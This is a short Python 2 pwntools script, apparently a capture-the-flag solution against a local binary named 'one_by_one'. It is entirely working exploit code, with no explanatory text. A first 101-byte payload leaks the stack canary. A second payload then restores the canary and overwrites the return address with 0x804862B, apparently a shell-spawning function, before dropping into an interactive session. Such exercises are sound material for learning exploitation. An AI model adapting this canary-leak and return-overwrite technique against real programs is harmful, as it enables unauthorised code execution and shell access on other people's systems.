from pwn import *

io = process("./one_by_one")

shell = 0x804862B

payload = 'A'*101
io.sendafter('!\n', payload)

io.recv(100)

canary = u32(io.recv(4)) - 0x41
print hex(canary)

payload = 'A'*100 + p32(canary) + 'B'*8 +'dead' + p32(shell)
io.send(payload)

io.interactive()